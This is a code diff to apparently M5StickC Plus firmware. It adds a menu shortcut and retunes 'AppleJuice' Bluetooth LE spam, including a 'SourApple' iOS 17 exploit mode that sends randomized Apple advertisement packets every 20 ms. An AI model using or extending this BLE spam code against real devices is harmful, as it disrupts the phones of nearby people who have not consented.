@@ -24,8 +24,9 @@ String timeStamp;
 int cursor = 0;
 int rotation = 1;
 int brightness = 100;
-bool rstOverride = false;
-bool sourApple = false;
+int ajDelay = 1000;
+bool rstOverride = false; // Reset Button Override. Set to true when navigating menus.
+bool sourApple = false;   // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
 #define EEPROM_SIZE 4
 
 struct MENU {
@@ -85,6 +86,16 @@ void screen_dim_proc() {
       M5.Axp.ScreenBreath(10);
       screen_dim_dimmed = true;
     }
+  }
+}
+
+// Tap the power button from pretty much anywhere to get to the main menu
+void check_axp_press() {
+  if (M5.Axp.GetBtnPress()) {
+    isSwitching = true;
+    rstOverride = false;
+    current_proc = 1;
+    delay(100);
   }
 }
 
@@ -698,14 +709,18 @@ void aj_adv(){
   // Isolating this to its own process lets us take advantage 
   // of the background stuff easier (menu button, dimmer, etc)
   rstOverride = true;
-  M5.Rtc.GetBm8563Time();
-  if (M5.Rtc.Second != advtime){
-    advtime = M5.Rtc.Second;
+  if (sourApple){
+    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
+    advtime = 0; // bypass ajDelay counter
+  }
+  if (millis() > advtime + ajDelay){
+    advtime = millis();
     pAdvertising->stop(); // This is placed here mostly for timing.
                           // It allows the BLE beacon to run through the loop.
     BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
-
     if (sourApple){
+      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
+      // Original credits for algorithm ECTO-1A & WillyJL
       uint8_t packet[17];
       uint8_t size = 17;
       uint8_t i = 0;
@@ -726,6 +741,9 @@ void aj_adv(){
       esp_fill_random(&packet[i], 3);
       oAdvertisementData.addData(std::string((char *)packet, 17));
     } else {
+      // TODO: use esp_fill_random to populate last 3 chars in data 
+      // payload for other appleJuice spam types to randomize device ID?
+      // 
       // sizeof() has to match the 31 and 23 byte char* however it doesn't seem
       // to work with bare integers, so sizeof() calls arbitrary elements of the
       // correct length. Without this if block, only 31-byte messages worked.
@@ -742,8 +760,10 @@ void aj_adv(){
     digitalWrite(M5_LED, HIGH); //LED OFF on Stick C Plus
   }
   if (digitalRead(M5_BUTTON_RST) == LOW) {
-    current_proc = 8;    
+    current_proc = 8;
+    sourApple = false;
     pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
+    aj_drawmenu();
     delay(250);
   }
 }
@@ -984,7 +1004,8 @@ void loop() {
   // Background processes
   switcher_button_proc();
   screen_dim_proc();
-
+  check_axp_press();
+  
   // Switcher
   if (isSwitching) {
     isSwitching = false;
